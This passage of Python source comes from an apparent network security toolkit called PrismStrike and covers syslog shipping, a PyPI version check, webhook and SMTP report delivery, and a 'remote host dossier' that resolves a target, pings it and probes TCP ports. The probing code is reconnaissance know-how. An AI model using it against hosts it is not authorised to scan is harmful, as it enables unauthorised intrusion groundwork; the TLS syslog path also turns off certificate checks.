    # -- transport --------------------------------------------------------
    def _close_socket(self) -> None:
        with self._lock:
            if self._sock is not None:
                try:
                    self._sock.close()
                except OSError:
                    pass
                self._sock = None

    def _send_bytes(self, payload: bytes) -> bool:
        """One synchronous delivery attempt on the worker (or caller) thread."""
        try:
            if self.protocol == "udp":
                with self._lock:
                    if self._sock is None:
                        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        self._sock.settimeout(self.timeout)
                    self._sock.sendto(payload, (self.host, self.port))
                return True
            with self._lock:
                if self._sock is None:
                    raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
                    if self.use_tls:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        raw = context.wrap_socket(raw, server_hostname=self.host)
                    self._sock = raw
                self._sock.sendall(payload + b"\n")
            return True
        except (OSError, ssl.SSLError, ValueError) as exc:
            self.last_error = "%s: %s" % (type(exc).__name__, exc)
            self.errors += 1
            self._close_socket()
            return False

    # -- lifecycle --------------------------------------------------------
    def start(self) -> bool:
        if self._worker is not None and self._worker.is_alive():
            return True
        self._stop_event.clear()
        try:
            socket.getaddrinfo(self.host, self.port, proto=socket.IPPROTO_UDP
                               if self.protocol == "udp" else socket.IPPROTO_TCP)
        except (socket.gaierror, OSError) as exc:
            raise FrameworkError("syslog collector '%s' cannot be resolved: %s" % (self.host, exc))
        self._worker = threading.Thread(target=self._run, name="prismstrike-syslog", daemon=True)
        self._worker.start()
        self.started_at = time.time()
        LOGGER.event("online", "syslog shipping active", data={"target": str(self), "protocol": self.protocol})
        return True

    def _run(self) -> None:
        while not self._stop_event.is_set():
            try:
                payload = self._queue.get(timeout=0.5)
            except _queue.Empty:
                continue
            if payload is None:
                break
            if self._send_bytes(payload):
                self.sent += 1
            else:
                # a single retry keeps transient blips from losing audit lines
                time.sleep(0.2)
                if self._send_bytes(payload):
                    self.sent += 1
                else:
                    self.dropped += 1
        self._close_socket()

    def send_line(self, level: str, category: str, message: str) -> bool:
        """Enqueue one event line; returns False only when the queue is saturated."""
        if self._worker is None or self._stop_event.is_set():
            return False
        try:
            self._queue.put_nowait(self.format_line(level, category, message))
            return True
        except _queue.Full:
            try:
                self._queue.get_nowait()
                self._queue.put_nowait(self.format_line(level, category, message))
                self.dropped += 1
                return True
            except (_queue.Empty, _queue.Full):
                self.dropped += 1
                return False

    def test(self) -> Dict[str, Any]:
        """Synchronous probe: prove the collector is actually reachable now."""
        marker = "prismstrike-syslog-selftest-%s" % uuid.uuid4().hex[:8]
        payload = self.format_line("INFO", "selftest", marker)
        ok_flag = self._send_bytes(payload)
        return OrderedDict([
            ("ok", ok_flag),
            ("target", str(self)),
            ("protocol", self.protocol),
            ("bytes", len(payload)),
            ("marker", marker),
            ("error", self.last_error if not ok_flag else ""),
            ("note", "UDP delivery is fire-and-forget; TCP success confirms the TCP handshake."
             if ok_flag and self.protocol == "udp" else ""),
        ])

    def stats(self) -> Dict[str, Any]:
        return OrderedDict([
            ("target", str(self)),
            ("facility", self.facility),
            ("protocol", self.protocol),
            ("tls", "enabled" if self.use_tls else "disabled"),
            ("queued", self._queue.qsize()),
            ("delivered", self.sent),
            ("dropped", self.dropped),
            ("errors", self.errors),
            ("last error", self.last_error or "none"),
            ("uptime", format_duration(time.time() - self.started_at) if self.started_at else "not started"),
        ])

    def stop(self, drain: bool = True) -> None:
        if self._worker is None:
            return
        if drain:
            deadline = time.time() + 2.0
            while not self._queue.empty() and time.time() < deadline:
                time.sleep(0.05)
        self._stop_event.set()
        try:
            self._queue.put_nowait(None)
        except _queue.Full:
            pass
        self._worker.join(timeout=2.0)
        self._close_socket()
        LOGGER.event("online", "syslog shipping stopped",
                     data={"target": str(self), "delivered": self.sent, "dropped": self.dropped})

    def __str__(self) -> str:
        return "%s://%s:%d (%s%s)" % (self.protocol, self.host, self.port, self.facility,
                                     ", tls" if self.use_tls else "")


def ship_session_to_syslog(shipper: "RemoteLogShipper", limit: int = 5000) -> Dict[str, Any]:
    """Re-send the current session's NDJSON events to the collector (backfill)."""
    sent = 0
    try:
        with open(LOGGER.json_path, "r", encoding="utf-8") as handle:
            for line in handle:
                if sent >= limit:
                    break
                try:
                    record = json.loads(line)
                except ValueError:
                    continue
                if shipper.send_line(str(record.get("level", "INFO")), str(record.get("kind", "event")),
                                     "backfill: %s" % record.get("message", "")):
                    sent += 1
        for _ in range(40):
            if shipper._queue.empty():
                break
            time.sleep(0.1)
    except (OSError, ValueError) as exc:
        raise FrameworkError("cannot backfill the session journal: %s" % exc)
    note("%d event(s) queued for syslog delivery." % sent)
    return OrderedDict([("queued", sent), ("target", str(shipper))])


def syslog_console_interactive() -> None:
    """Menu wrapper for 10 option 6 - configure, test and use remote shipping."""
    while True:
        heading("REMOTE SYSLOG SHIPPING")
        current = getattr(LOGGER, "syslog_shipper", None)
        kv_table([
            ("Active collector", str(current) if current else "none attached"),
            ("Session journal", LOGGER.json_path),
            ("Delivery model", "queue + daemon worker (never blocks the CLI)"),
            ("Format", "RFC5424 <PRI>1 TIMESTAMP HOST APP PROCID MSGID - MESSAGE"),
        ])
        options = OrderedDict([
            ("1", "Configure and attach a collector"),
            ("2", "Send a test line (synchronous probe)"),
            ("3", "Backfill this session's events to the collector"),
            ("4", "Show delivery statistics"),
            ("5", "Detach the collector"),
            ("0", "Return to the previous menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("syslog> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "1":
            spec = prompt_text("collector host[:port][/udp|tcp], e.g. 10.0.0.5:5514/tcp")
            if spec is PROMPT_ABORT:
                continue
            facility = prompt_choice("facility", list(SYSLOG_FACILITIES.keys()), "local0")
            if facility is PROMPT_ABORT:
                continue
            use_tls = prompt_yes_no("wrap TCP transport in TLS?", False)
            try:
                target = parse_syslog_target(str(spec))
                shipper = RemoteLogShipper(host=target["host"], port=target["port"],
                                           protocol=target["protocol"], facility=str(facility),
                                           use_tls=use_tls)
                if shipper.start():
                    previous = getattr(LOGGER, "syslog_shipper", None)
                    if previous is not None:
                        try:
                            previous.stop()
                        except Exception:
                            pass
                    LOGGER.attach_syslog(shipper)
                    probe = shipper.test()
                    ok("shipping attached to %s (probe %s)" % (shipper, "ok" if probe["ok"] else "failed"))
                    if not probe["ok"]:
                        warn("probe failed: %s - events will be queued and retried." % probe["error"])
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "2":
            if current is None:
                warn("no collector attached - use option 1 first.")
                continue
            probe = current.test()
            kv_table(probe.items())
        elif choice == "3":
            if current is None:
                warn("no collector attached - use option 1 first.")
                continue
            limit = prompt_int("maximum events to backfill", 1, 100000, 5000)
            if limit is PROMPT_ABORT:
                continue
            try:
                ship_session_to_syslog(current, int(limit))
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "4":
            if current is None:
                warn("no collector attached.")
                continue
            kv_table(current.stats().items())
        elif choice == "5":
            if current is None:
                warn("nothing to detach.")
                continue
            current.stop()
            LOGGER.attach_syslog(None)
            ok("collector detached; local journaling continues.")
        else:
            warn("unrecognised selection '%s'." % choice)


# ---------------------------------------------------------------------------
# 11 - ONLINE DEPENDENCY FRESHNESS AUDIT
# ---------------------------------------------------------------------------
def _installed_version(package: str) -> str:
    try:
        from importlib import metadata as _metadata  # local import keeps startup lean
        return str(_metadata.version(package))
    except Exception:
        return ""


def _version_tuple(value: str) -> Tuple[int, ...]:
    parts: List[int] = []
    for token in re.split(r"[^0-9]+", str(value)):
        if token.isdigit():
            parts.append(int(token))
        elif parts:
            break
    return tuple(parts or [0])


def online_dependency_check(packages: Optional[Sequence[str]] = None,
                            api_base: str = "https://pypi.org/pypi",
                            timeout: float = 8.0) -> Dict[str, Any]:
    """
    ONLINE freshness audit: compare the installed versions with the latest
    published releases (PyPI JSON API) and measure outbound reachability.

    api_base is parameterised so the check can be validated against a stub in
    the self-test without ever pointing the framework at real infrastructure.
    """
    package_list = list(packages or ("scapy", "python-nmap"))
    base = str(api_base).rstrip("/")
    started = time.time()
    rows: List[Dict[str, Any]] = []
    reachable = True
    reachability_detail = ""
    for package in package_list:
        installed = _installed_version(package)
        if package == "scapy" and not installed:
            installed = scapy_version_string()
        row: Dict[str, Any] = OrderedDict([
            ("package", package), ("installed", installed or "not installed"),
            ("latest", "unknown"), ("status", "unknown"), ("detail", ""),
        ])
        try:
            payload = _http_json("%s/%s/json" % (base, package), timeout=timeout)
            row["latest"] = str(payload.get("info", {}).get("version", "") or "unknown")
            if not installed:
                row["status"] = "not installed"
                row["detail"] = "pip install %s" % package
            elif _version_tuple(row["latest"]) > _version_tuple(installed):
                row["status"] = "update available"
                row["detail"] = "pip install -U %s" % package
            elif _version_tuple(row["latest"]) < _version_tuple(installed):
                row["status"] = "ahead of release"
                row["detail"] = "local build is newer than the published release"
            else:
                row["status"] = "up to date"
                row["detail"] = "no action needed"
        except FrameworkError as exc:
            reachable = False
            row["status"] = "unreachable"
            row["detail"] = str(exc)[:120]
            if not reachability_detail:
                reachability_detail = str(exc)[:160]
        rows.append(row)
    elapsed = time.time() - started
    apt_line = ""
    if shutil.which("apt-cache"):
        policy = InterfaceManager._run(["apt-cache", "policy", "nmap"])
        for line in policy.splitlines():
            if "Candidate:" in line or "Installed:" in line:
                apt_line += line.strip() + "  "
    heading("ONLINE DEPENDENCY CHECK")
    out(c("  %-16s %-14s %-14s %-18s %s" % ("PACKAGE", "INSTALLED", "LATEST", "STATUS", "ACTION"), "bold"))
    for row in rows:
        colour = {"up to date": "bgreen", "update available": "byellow",
                  "unreachable": "bred", "not installed": "byellow"}.get(row["status"], "grey")
        out("  %-16s %-14s %-14s %-18s %s" % (
            row["package"], row["installed"][:14], row["latest"][:14],
            c(row["status"], colour, "bold"), c(row["detail"][:44], "grey")))
    out("")
    kv_table([
        ("Release API", base),
        ("Outbound reachability", "ok" if reachable else "degraded"),
        ("Round trip", "%.2fs" % elapsed),
        ("apt nmap policy", apt_line.strip() or "apt-cache unavailable"),
    ])
    if not reachable:
        warn("release API unreachable: %s" % reachability_detail)
        note("this is normal on air-gapped segments - all local capabilities keep working offline.")
    summary = OrderedDict([
        ("mode", "online-dependency-check"),
        ("api_base", base),
        ("reachable", reachable),
        ("round_trip_seconds", round(elapsed, 2)),
        ("packages", rows),
        ("apt_nmap_policy", apt_line.strip()),
    ])
    artifact = LOGGER.scan("online_deps", summary, target=base)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def online_dependency_check_interactive() -> None:
    """Menu wrapper for 11 option 5."""
    base = prompt_text("release API base", default="https://pypi.org/pypi")
    if base is PROMPT_ABORT:
        return
    timeout = prompt_float("per-request timeout seconds", 1.0, 120.0, 8.0)
    if timeout is PROMPT_ABORT:
        return
    try:
        online_dependency_check(api_base=str(base).strip(), timeout=float(timeout))
    except FrameworkError as exc:
        err(str(exc))


# ---------------------------------------------------------------------------
# 09 - REMOTE HOST DOSSIER (online counterpart of the local host report)
# ---------------------------------------------------------------------------
REMOTE_DOSSIER_DEFAULT_PORTS = (22, 80, 443, 445, 3389)


def _tcp_connect_probe(host: str, port: int, timeout: float) -> Dict[str, Any]:
    """Single TCP connect probe with round-trip timing (no payload sent)."""
    started = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(max(0.2, timeout))
        code = sock.connect_ex((host, port))
        elapsed = (time.time() - started) * 1000.0
        return OrderedDict([("port", port), ("open", code == 0),
                            ("state", "open" if code == 0 else "closed/filtered"),
                            ("rtt_ms", round(elapsed, 1)),
                            ("service", COMMON_PORTS.get(port, ""))])
    except (socket.timeout, OSError) as exc:
        return OrderedDict([("port", port), ("open", False),
                            ("state", "error: %s" % type(exc).__name__),
                            ("rtt_ms", round((time.time() - started) * 1000.0, 1)),
                            ("service", COMMON_PORTS.get(port, ""))])
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def remote_host_dossier(target: str, ports: Optional[Sequence[int]] = None, count: int = 3,
                        timeout: float = 2.0, include_route: bool = True) -> Dict[str, Any]:
    """
    Build a dossier on a REMOTE host using only online sources: forward DNS,
    reverse PTR, route decision, ICMP round-trip statistics, coarse TTL-based
    stack hint and TCP connect probes.
    """
    target_text = str(target).strip()
    if not target_text:
        raise FrameworkError("no target supplied")
    port_list: List[int] = []
    for raw_port in (ports if ports is not None else REMOTE_DOSSIER_DEFAULT_PORTS):
        try:
            port_list.append(parse_port(raw_port))
        except FrameworkError as exc:
            warn("skipping port %s: %s" % (raw_port, exc))
    count = max(1, min(10, int(count)))
    resolved = resolve_target(target_text)
    if not resolved:
        raise FrameworkError("'%s' could not be resolved" % target_text)
    # reverse DNS
    reverse = ""
    if not ipaddress.ip_address(resolved).is_loopback:
        try:
            reverse = socket.gethostbyaddr(resolved)[0]
        except (socket.herror, socket.gaierror, OSError):
            reverse = ""
    else:
        try:
            reverse = socket.gethostbyaddr(resolved)[0]
        except (socket.herror, socket.gaierror, OSError):
            reverse = "localhost"
    heading("REMOTE HOST DOSSIER")
    note("target %s resolved to %s" % (target_text, resolved))
    route: Dict[str, Any] = {}
    if include_route:
        try:
            route = route_lookup(resolved)
        except FrameworkError as exc:
            warn("route lookup unavailable: %s" % exc)
    icmp_stats: Dict[str, Any] = OrderedDict([
        ("sent", 0), ("replies", 0), ("loss_percent", 100.0), ("rtt_min_ms", None),
        ("rtt_avg_ms", None), ("rtt_max_ms", None), ("ttl", None), ("stack_hint", "unknown"),
    ])
    if SCAPY_AVAILABLE and Privileges.raw_socket_available():
        rtts: List[float] = []
        ttl_seen: Optional[int] = None
        for sequence in range(count):
            try:
                probe = PacketBuilder.icmp(resolved, icmp_type=8, seq=sequence)
                started = time.time()
                reply = sr1(probe, timeout=max(0.5, timeout), verbose=0)
                icmp_stats["sent"] += 1
                if reply is not None and reply.haslayer(ICMP):
                    rtts.append((time.time() - started) * 1000.0)
                    try:
                        ttl_seen = int(reply[IP].ttl)
                    except (AttributeError, IndexError, TypeError):
                        pass
                time.sleep(0.1)
            except (OSError, PermissionError) as exc:
                warn("ICMP probe error: %s" % exc)
                break
        icmp_stats["replies"] = len(rtts)
        if icmp_stats["sent"]:
            icmp_stats["loss_percent"] = round(100.0 * (1 - len(rtts) / float(icmp_stats["sent"])), 1)
        if rtts:
            icmp_stats["rtt_min_ms"] = round(min(rtts), 2)
            icmp_stats["rtt_avg_ms"] = round(sum(rtts) / len(rtts), 2)
            icmp_stats["rtt_max_ms"] = round(max(rtts), 2)
        icmp_stats["ttl"] = ttl_seen
        if ttl_seen is not None:
            if ttl_seen <= 64:
                icmp_stats["stack_hint"] = "Linux/BSD-shaped TTL (<=64)"
            elif ttl_seen <= 128:
                icmp_stats["stack_hint"] = "Windows-shaped TTL (<=128)"
            else:
                icmp_stats["stack_hint"] = "appliance/network-device TTL (>128)"
    else:
        note("ICMP statistics need root/CAP_NET_RAW - continuing with TCP probes only.")
    tcp_rows = [_tcp_connect_probe(resolved, port, timeout) for port in port_list]
    open_ports = [row["port"] for row in tcp_rows if row["open"]]
    kv_table([
        ("Target", target_text),
        ("Resolved address", resolved),
        ("Reverse DNS (PTR)", reverse or "no PTR record"),
        ("Route interface", route.get("interface", "n/a") if isinstance(route, dict) else "n/a"),
        ("Next hop", route.get("gateway") or route.get("next_hop", "n/a")
         if isinstance(route, dict) else "n/a"),
        ("ICMP replies", "%d/%d (%.1f%% loss)" % (icmp_stats["replies"], icmp_stats["sent"],
                                                  icmp_stats["loss_percent"])),
        ("ICMP RTT min/avg/max", "%s / %s / %s ms" % (icmp_stats["rtt_min_ms"], icmp_stats["rtt_avg_ms"],
                                                      icmp_stats["rtt_max_ms"])),
        ("Initial TTL / stack hint", "%s / %s" % (icmp_stats["ttl"], icmp_stats["stack_hint"])),
        ("TCP ports open", ", ".join(str(port) for port in open_ports) or "none of the probed set"),
    ])
    if tcp_rows:
        out(c("  %-7s %-16s %-10s %s" % ("PORT", "STATE", "RTT", "SERVICE"), "bold"))
        for row in tcp_rows:
            colour = "bgreen" if row["open"] else "grey"
            out("  %-7d %-16s %-10s %s" % (row["port"], c(row["state"], colour),
                                           "%.1f ms" % row["rtt_ms"], row["service"] or "-"))
    summary = OrderedDict([
        ("mode", "remote-host-dossier"),
        ("target", target_text),
        ("resolved", resolved),
        ("reverse_dns", reverse),
        ("route", route),
        ("icmp", icmp_stats),
        ("tcp", tcp_rows),
        ("ports_open", open_ports),
    ])
    artifact = LOGGER.scan("remote_dossier", summary, target=target_text)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def remote_host_dossier_interactive() -> None:
    """Menu wrapper for 09 option 7."""
    target = prompt_text("remote target (hostname or IPv4)")
    if target is PROMPT_ABORT:
        return
    ports_raw = prompt_text("TCP ports to probe (comma separated, blank = default set)",
                            default="", allow_blank=True)
    if ports_raw is PROMPT_ABORT:
        return
    ports: Optional[List[int]] = None
    if str(ports_raw).strip():
        ports = []
        for token in re.split(r"[,\s]+", str(ports_raw)):
            if not token:
                continue
            try:
                ports.append(parse_port(token))
            except FrameworkError as exc:
                err(str(exc))
                ports = None
                break
        if ports is None:
            return
    count = prompt_int("ICMP samples", 1, 10, 3)
    if count is PROMPT_ABORT:
        return
    timeout = prompt_float("per-probe timeout seconds", 0.3, 30.0, 2.0)
    if timeout is PROMPT_ABORT:
        return
    try:
        remote_host_dossier(str(target).strip(), ports=ports, count=int(count), timeout=float(timeout))
    except (FrameworkError, ValueError) as exc:
        err(str(exc))


# ---------------------------------------------------------------------------
# 18 - ONLINE DELIVERY (webhook push + SMTP email)
# ---------------------------------------------------------------------------
def push_report_webhook(path: str, url: str, token: str = "", field_name: str = "report",
                        timeout: float = 30.0,
                        extra_fields: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """
    POST a report file to a remote HTTP(S) endpoint as multipart/form-data.

    Works with any webhook receiver, ticket-system intake or SOAR platform; a
    bearer token is attached when supplied.
    """
    source = os.path.expanduser(str(path))
    if not os.path.isfile(source):
        raise FrameworkError("report file not found: %s" % source)
    size = os.path.getsize(source)
    if size == 0:
        raise FrameworkError("report file is empty: %s" % source)
    boundary = "----prismstrike-%s" % uuid.uuid4().hex
    filename = os.path.basename(source)
    content_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"
    with open(source, "rb") as handle:
        payload = handle.read()
    parts: List[bytes] = []
    for key, value in (extra_fields or {}).items():
        parts.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                      % (boundary, key, value)).encode("utf-8"))
    parts.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                  "Content-Type: %s\r\n\r\n" % (boundary, field_name, filename, content_type)).encode("utf-8"))
    parts.append(payload)
    parts.append(("\r\n--%s--\r\n" % boundary).encode("utf-8"))
    body = b"".join(parts)
    headers = {"Content-Type": "multipart/form-data; boundary=%s" % boundary,
               "Content-Length": str(len(body))}
    if token:
        headers["Authorization"] = "Bearer %s" % token
    out("  %s pushing %s (%s) to %s" % (c("ONLINE", "bcyan", "bold"), filename,
                                        format_bytes(size), url))
    started = time.time()
    response = _http_request(url, data=body, headers=headers, timeout=timeout, method="POST")
    status = 0
    snippet = ""
    try:
        status = int(getattr(response, "status", 0) or 0)
        snippet = response.read(4096).decode("utf-8", "replace")
    except (OSError, ValueError):
        snippet = ""
    finally:
        try:
            response.close()
        except OSError:
            pass
    elapsed = time.time() - started
    heading("WEBHOOK DELIVERY")
    kv_table([
        ("Endpoint", url[:70]),
        ("File", "%s (%s)" % (filename, format_bytes(size))),
        ("HTTP status", status),
        ("Round trip", "%.2fs" % elapsed),
        ("Bearer token", "sent" if token else "none"),
        ("Response (first 200 chars)", snippet[:200].replace("\n", " ") or "(empty)"),
    ])
    delivered = 200 <= status < 300
    if delivered:
        ok("report accepted by the remote endpoint.")
    else:
        warn("endpoint returned HTTP %s - check the URL, token and receiver policy." % status)
    summary = OrderedDict([
        ("mode", "webhook-push"),
        ("url", url),
        ("file", source),
        ("bytes", size),
        ("status", status),
        ("delivered", delivered),
        ("round_trip_seconds", round(elapsed, 2)),
        ("response_snippet", snippet[:500]),
    ])
    artifact = LOGGER.scan("webhook_push", summary, target=url)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def email_report_smtp(smtp_host: str, recipients: Sequence[str], sender: str = "",
                      subject: str = "", body_text: str = "", attachments: Sequence[str] = (),
                      port: int = 587, username: str = "", password: str = "",
                      use_starttls: bool = True, timeout: float = 20.0,
                      dry_run: bool = False) -> Dict[str, Any]:
    """
    Email the session summary (Markdown/HTML/report attachments) over SMTP.

    STARTTLS is used by default; authentication is optional for relay hosts that
    accept the sender by IP. dry_run renders the exact message without sending,
    which is what the self-test exercises against a stub server.
    """
    host = str(smtp_host).strip()
    if not host:
        raise FrameworkError("no SMTP host supplied")
    recipient_list = [str(item).strip() for item in recipients if str(item).strip()]
    if not recipient_list:
        raise FrameworkError("no recipients supplied")
    sender_address = str(sender).strip() or "prismstrike@%s" % (platform.node() or "localhost")
    message = EmailMessage()
    message["From"] = sender_address
    message["To"] = ", ".join(recipient_list)
    message["Subject"] = str(subject).strip() or "PrismStrike session %s" % LOGGER.session_id
    message["Date"] = _email_formatdate(localtime=True)
    message["Message-ID"] = _email_make_msgid(domain="prismstrike.local")
    message["X-Netforge-Session"] = LOGGER.session_id
    message.set_content(str(body_text).strip() or "PrismStrike session report attached.")
    attached: List[Tuple[str, int]] = []
    for attachment in attachments:
        source = os.path.expanduser(str(attachment))
        if not os.path.isfile(source):
            warn("attachment skipped (not found): %s" % source)
            continue
        guessed, _ = mimetypes.guess_type(source)
        maintype, _, subtype = (guessed or "application/octet-stream").partition("/")
        try:
            with open(source, "rb") as handle:
                blob = handle.read()
        except OSError as exc:
            warn("attachment unreadable (%s): %s" % (os.path.basename(source), exc))
            continue
        message.add_attachment(blob, maintype=maintype, subtype=subtype or "octet-stream",
                               filename=os.path.basename(source))
        attached.append((os.path.basename(source), len(blob)))
    if dry_run:
        heading("SMTP DELIVERY (DRY RUN)")
        kv_table([
            ("SMTP host", "%s:%d" % (host, int(port))),
            ("STARTTLS", "would negotiate" if use_starttls else "plain"),
            ("From", sender_address),
            ("To", ", ".join(recipient_list)),
            ("Subject", str(message["Subject"])),
            ("Body bytes", len(message.get_body(("plain",)))) if message.get_body(("plain",)) else ("Body bytes", len(str(body_text))),
            ("Attachments", ", ".join("%s (%s)" % (name, format_bytes(size)) for name, size in attached) or "none"),
        ])
        note("dry run complete - the message was rendered but not transmitted.")
        summary = OrderedDict([
            ("mode", "email-summary"), ("dry_run", True), ("host", host), ("port", int(port)),
            ("from", sender_address), ("to", recipient_list),
            ("subject", str(message["Subject"])), ("attachments", attached),
        ])
        LOGGER.scan("email_summary", summary, target=host)
        return summary
    out("  %s sending '%s' to %s via %s:%d%s"
        % (c("ONLINE", "bcyan", "bold"), message["Subject"], ", ".join(recipient_list),
           host, int(port), " (STARTTLS)" if use_starttls else ""))
    started = time.time()
    server: Any = None
    try:
        server = smtplib.SMTP(host, int(port), timeout=max(3.0, float(timeout)))
        server.ehlo()
        if use_starttls:
            context = ssl.create_default_context()
            try:
                server.starttls(context=context)
            except smtplib.SMTPException as exc:
                raise FrameworkError("STARTTLS negotiation failed: %s" % exc)
            server.ehlo()
        if username:
            try:
                server.login(str(username), str(password))
            except smtplib.SMTPAuthenticationError as exc:
                raise FrameworkError("SMTP authentication rejected: %s" % exc)
        refused = server.send_message(message)
        if refused:
            warn("some recipients were refused: %s" % ", ".join(refused.keys()))
    except (smtplib.SMTPException, OSError, ssl.SSLError) as exc:
        raise FrameworkError("SMTP delivery failed: %s: %s" % (type(exc).__name__, exc))
    finally:
        if server is not None:
            try:
                server.quit()
            except (smtplib.SMTPException, OSError):
                pass
    elapsed = time.time() - started
    heading("SMTP DELIVERY")
    kv_table([
        ("SMTP host", "%s:%d" % (host, int(port))),
        ("Transport", "STARTTLS" if use_starttls else "plain SMTP"),
        ("From", sender_address),
        ("To", ", ".join(recipient_list)),
        ("Subject", str(message["Subject"])),
        ("Attachments", ", ".join("%s (%s)" % (name, format_bytes(size)) for name, size in attached) or "none"),
        ("Round trip", "%.2fs" % elapsed),
    ])
    ok("session summary delivered.")
    summary = OrderedDict([
        ("mode", "email-summary"), ("dry_run", False), ("host", host), ("port", int(port)),
        ("from", sender_address), ("to", recipient_list), ("subject", str(message["Subject"])),
        ("attachments", attached), ("round_trip_seconds", round(elapsed, 2)),
    ])
    artifact = LOGGER.scan("email_summary", summary, target=host)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def push_report_interactive() -> None:
    """Menu wrapper for 18 option 8 - generate (if needed) and push the report."""
    path = ""
    try:
        path = generate_html_report()
    except FrameworkError as exc:
        err(str(exc))
        return
    url = prompt_text("webhook URL (http/https)")
    if url is PROMPT_ABORT:
        return
    token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
    if token is PROMPT_ABORT:
        return
    source = prompt_text("file to push (blank = the HTML report just generated)", default="", allow_blank=True)
    if source is PROMPT_ABORT:
        return
    try:
        push_report_webhook(str(source).strip() or path, str(url).strip(), token=str(token).strip())
    except FrameworkError as exc:
        err(str(exc))


def email_report_interactive() -> None:
    """Menu wrapper for 18 option 9 - email the session summary."""
    try:
        md_path = export_markdown_summary()
    except FrameworkError as exc:
        err(str(exc))
        md_path = ""
    try:
        html_path = generate_html_report()
    except FrameworkError as exc:
        err(str(exc))
        html_path = ""
    host = prompt_text("SMTP host (hostname or IPv4)")
    if host is PROMPT_ABORT:
        return
    port = prompt_int("SMTP port", 1, 65535, 587)
    if port is PROMPT_ABORT:
        return
    sender = prompt_text("sender address (blank = prismstrike@host)", default="", allow_blank=True)
    if sender is PROMPT_ABORT:
        return
    recipients_raw = prompt_text("recipients (comma separated)")
    if recipients_raw is PROMPT_ABORT:
        return
    recipients = [token.strip() for token in re.split(r"[,\s]+", str(recipients_raw)) if token.strip()]
    if not recipients:
        warn("no recipients supplied.")
        return
    subject = prompt_text("subject", default="PrismStrike session %s" % LOGGER.session_id)
    if subject is PROMPT_ABORT:
        return
    use_tls = prompt_yes_no("negotiate STARTTLS?", True)
    username = prompt_text("SMTP username (blank = no auth)", default="", allow_blank=True)
    if username is PROMPT_ABORT:
        return
    password = ""
    if str(username).strip():
        import getpass as _getpass
        try:
            password = _getpass.getpass("  SMTP password (not echoed, not logged): ")
        except (EOFError, KeyboardInterrupt):
            warn("password entry aborted - delivery cancelled.")
            return
    dry_run = prompt_yes_no("dry run (render only, transmit nothing)?", False)
    attachments = [item for item in (md_path, html_path) if item]
    try:
        email_report_smtp(str(host).strip(), recipients, sender=str(sender).strip(),
                          subject=str(subject), attachments=attachments, port=int(port),
                          username=str(username).strip(), password=password,
                          use_starttls=bool(use_tls), dry_run=bool(dry_run))
    except FrameworkError as exc:
        err(str(exc))


# ---------------------------------------------------------------------------
# Loopback stubs used by the self-test (and usable for operator dry runs)
# ---------------------------------------------------------------------------
class LoopbackHTTPServer:
    """
    Minimal threaded HTTP server bound to 127.0.0.1.

    'responder(method, path, headers, body)' returns (status, content_type, bytes).
    Every request is recorded in self.requests so tests can assert on delivery.
    """

    def __init__(self, responder: Callable[[str, str, Dict[str, str], bytes], Tuple[int, str, bytes]],
                 host: str = "127.0.0.1") -> None:
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        self.responder = responder
        self.requests: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        outer = self

        class _Handler(BaseHTTPRequestHandler):
            server_version = "prismstrike-stub/1.0"

            def log_message(self, fmt, *args):  # noqa: A003 - stdlib signature
                return

            def _serve(self) -> None:
                try:
                    length = int(self.headers.get("Content-Length") or 0)
                except (TypeError, ValueError):
                    length = 0
                body = b""
                if length:
                    try:
                        body = self.rfile.read(min(length, 8 * 1024 * 1024))
                    except (OSError, ValueError):
                        body = b""
                headers = {key: value for key, value in self.headers.items()}
                with outer._lock:
                    outer.requests.append(OrderedDict([
                        ("method", self.command), ("path", self.path),
                        ("headers", headers), ("body_len", len(body)),
                        ("body_preview", body[:2048].decode("utf-8", "replace")),
                    ]))
                extra_headers: Dict[str, str] = {}
                try:
                    produced = outer.responder(self.command, self.path, headers, body)
                    if isinstance(produced, tuple) and len(produced) == 4:
                        status, content_type, payload, extra_headers = produced
                    else:
                        status, content_type, payload = produced
                except Exception as exc:  # a stub must never take the test down
                    status, content_type, payload = 500, "text/plain", str(exc).encode("utf-8")
                try:
                    self.send_response(int(status))
                    self.send_header("Content-Type", content_type)
                    for header_name, header_value in dict(extra_headers or {}).items():
                        self.send_header(str(header_name), str(header_value))
                    self.send_header("Content-Length", str(len(payload)))
                    self.end_headers()
                    if self.command != "HEAD":
                        self.wfile.write(payload)
                except (BrokenPipeError, ConnectionResetError, OSError):
                    return

            do_GET = _serve
            do_POST = _serve
            do_PUT = _serve
            do_HEAD = _serve

        self._server = ThreadingHTTPServer((host, 0), _Handler)
        self._server.daemon_threads = True
        self.host, self.port = self._server.server_address[0], int(self._server.server_address[1])
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)

    @property
    def url_base(self) -> str:
        return "http://%s:%d" % (self.host, self.port)

    def start(self) -> "LoopbackHTTPServer":
        self._thread.start()
        return self

    def stop(self) -> None:
        try:
            self._server.shutdown()
            self._server.server_close()
        except OSError:
            pass

    def __enter__(self) -> "LoopbackHTTPServer":
        return self.start()

    def __exit__(self, exc_type, exc, tb) -> None:
        self.stop()


class LoopbackSMTPServer:
    """
    Minimal SMTP responder for delivery verification.

    Speaks just enough of RFC 5321 for smtplib (greeting, EHLO/HELO, MAIL, RCPT,
